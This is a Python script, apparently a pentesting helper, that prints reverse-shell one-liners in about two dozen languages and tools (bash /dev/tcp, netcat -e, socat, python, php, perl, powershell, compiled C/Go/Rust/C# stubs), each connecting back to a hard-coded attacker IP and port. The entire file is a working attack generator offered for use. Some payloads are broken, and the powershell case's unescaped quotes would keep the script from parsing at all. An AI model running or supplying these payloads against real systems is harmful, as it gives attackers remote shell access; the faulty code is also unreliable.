# ENTER YOUR IP ADDRESS AND PORT IN THE CODE
# TO RUN: python3 reverseshell.py bash

import sys

# Check if enough arguments are provided
if len(sys.argv) < 1:
    print("Error: too few arguments.")
    print("Usage: python script.py <shelltype> ")
    sys.exit(1)
elif len(sys.argv) > 2:
    print("Error: too many arguments.")
    print("Usage: python script.py <shelltype>")
    sys.exit(1)

# main
param_1 = sys.argv[1]

hostip="192.168.23.45" # change this
hostport="1234" #change this


# Switch case to choose what type of script is needed
def check_type(arg):
    match arg:
        case "bash":
            return f"/bin/bash -i >& /dev/tcp/{hostip}/{hostport} 0>&1"
        case "socat":
            return f"socat tcp:{hostip}:{hostport} exec:'bash -i' ,pty,stderr,setsid,sigint,sane &"
        case "java":
            return f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{hostip}/{hostport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()"
        case "python":
            return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{hostip}\",{hostport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        case "php":
            return f"php -r '$sock=fsockopen(\"{hostip}\",{hostport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        case "nc.exe":
            return f"nc.exe {hostip} {hostport} -e /bin/bash"
        case "ruby":
            return f"ruby -rsocket -e'f=TCPSocket.open(\"{hostip}\",{hostport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        case "perl":
            return f"perl -e 'use Socket;$i=\"{hostip}\";$p={hostport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        case "go":
            return f"echo \"package main; import \\\"net\\\"; import \\\"os\\\"; import \\\"os/exec\\\"; func main(){{conn,_ := net.Dial(\\\"tcp\\\", \\\"{hostip}:{hostport}\\\"); cmd := exec.Command(\\\"/bin/sh\\\"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run()}}\" > reverse.go && go run reverse.go"
        case "lua":
            return f"lua -e \"require('socket');TCP=socket.tcp();TCP:connect('{hostip}', {hostport});os.execute('/bin/sh -i <&3 >&3 2>&3')\""
        case "rust":
            return f"cargo new reverse_shell --bin && cd reverse_shell && echo 'use std::net::TcpStream; use std::process::{{Command, Stdio}}; fn main() {{ let mut stream = TcpStream::connect(\\\"{hostip}\\\", {hostport}).unwrap(); let child = Command::new(\\\"/bin/sh\\\").stdin(Stdio::from(stream.try_clone().unwrap())).stdout(Stdio::from(stream)).spawn().unwrap(); child.wait().unwrap(); }}' > src/main.rs && cargo run"
        case "haskell":
            return f"ghc -e \"import Network.Socket; import System.Process; main = do {{ s <- socket AF_INET Stream defaultProtocol; connect s (SockAddrInet {hostport} (tupleToHostAddress ('{hostip}', 0))); _ <- runInteractiveCommand \"/bin/sh -i\"; return () }}\""
        case "d":
            return f"echo 'import std.socket, std.process; void main() {{ auto s = new TcpSocket; s.connect(\"{hostip}\", {hostport}); auto p = popen(\"/bin/sh\", \"r\", s);}}' > reverse.d && dmd reverse.d && ./reverse"
        case "swift":
            return f"swift -e 'import Foundation; let task = Process(); let pipe = Pipe(); task.launchPath = \"/bin/bash\"; task.arguments = [\"-i\"]; task.standardInput = pipe; task.standardOutput = pipe; task.standardError = pipe; task.launch(); let sock = try! Socket.create(family: .inet, type: .stream, protocol: .tcp); try! sock.connect(to: \"{hostip}\", port: {hostport}); try! sock.write(from: pipe.fileHandleForReading);'"
        case "zsh":
            return f"zsh -i >& /dev/tcp/{hostip}/{hostport} 0>&1"
        case "docker":
            return f"docker run -it --rm alpine sh -c \"exec 5<>/dev/tcp/{hostip}/{hostport}; cat <&5 | while read line; do $line 2>&5 >&5; done\""
        case "vim":
            return f"vim -c ':!bash -i >& /dev/tcp/{hostip}/{hostport} 0>&1' -c ':qa'"
        case "android":
            return f"pkg install nc -y && nc -e /system/bin/sh {hostip} {hostport}"
        case "c":
            return f"echo '#include <stdio.h>#include <string.h>#include <stdlib.h>#include <unistd.h>#include <arpa/inet.h>#include <sys/socket.h>int main(){{struct sockaddr_in server;int sockfd;char *hostip=\"{hostip}\";int hostport={hostport};sockfd=socket(AF_INET, SOCK_STREAM, 0);server.sin_family=AF_INET;server.sin_port=htons(hostport);server.sin_addr.s_addr=inet_addr(hostip);connect(sockfd,(struct sockaddr*)&server,sizeof(server));dup2(sockfd,0);dup2(sockfd,1);dup2(sockfd,2);execve(\"/bin/sh\",NULL,NULL);}}' > reverse.c && gcc reverse.c -o reverse && ./reverse"
        case "bash_timeout":
            return f"timeout 10 bash -i >& /dev/tcp/{hostip}/{hostport} 0>&1"
        case "openssl":
            return f"openssl s_client -connect {hostip}:{hostport} -quiet < /bin/sh | nc {hostip} {hostport}"
        case "tcl":
            return f"echo 'package require Tclx; socket connect {hostip} {hostport}; fdopen stdout; exec /bin/sh <&0 >&0 2>&0' > reverse.tcl && tclsh reverse.tcl"
        case "c#":
            return f"echo 'using System; using System.Net.Sockets; using System.IO; class ReverseShell {{ static void Main(string[] args) {{ var tcpClient = new TcpClient(\"{hostip}\", {hostport}); var networkStream = tcpClient.GetStream(); var writer = new StreamWriter(networkStream); var reader = new StreamReader(networkStream); while (true) {{ var command = reader.ReadLine(); var process = new System.Diagnostics.Process(); process.StartInfo.FileName = \"/bin/bash\"; process.StartInfo.Arguments = \"-c \" + command; process.StartInfo.RedirectStandardOutput = true; process.Start(); writer.WriteLine(process.StandardOutput.ReadToEnd()); writer.Flush(); }} }} }}' > ReverseShell.cs && csc ReverseShell.cs && ./ReverseShell.exe"
        case "powershell":
            return f"$LHOST = "{hostip}"; $LPORT = {hostport}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"

        # Default case
        case _:
            return "Unknown script type"
        
result = check_type(sys.argv[1])
print(result)
